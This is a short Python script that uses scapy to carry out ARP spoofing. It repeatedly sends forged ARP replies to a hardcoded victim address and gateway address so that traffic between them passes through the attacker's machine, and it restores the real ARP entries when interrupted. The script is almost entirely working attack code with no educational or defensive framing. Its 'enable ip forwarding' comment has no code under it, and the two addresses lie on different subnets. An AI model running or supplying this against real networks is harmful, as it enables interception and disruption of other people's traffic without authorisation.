from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

#Returns MAC address of any device connected to the network
#If ip is down, returns None instead
def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    
#Spoofs `target_ip` saying that we are `host_ip`.
#it is accomplished by changing the ARP cache of the target (poisoning)
def spoof(target_ip, host_ip, verbose=True):
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

#Restore the normal process of a regular network
def restore(target_ip, host_ip, verbose=True):
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    # victim ip address
    target = "192.168.56.101"
    # gateway ip address
    host = "192.168.178.24"
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
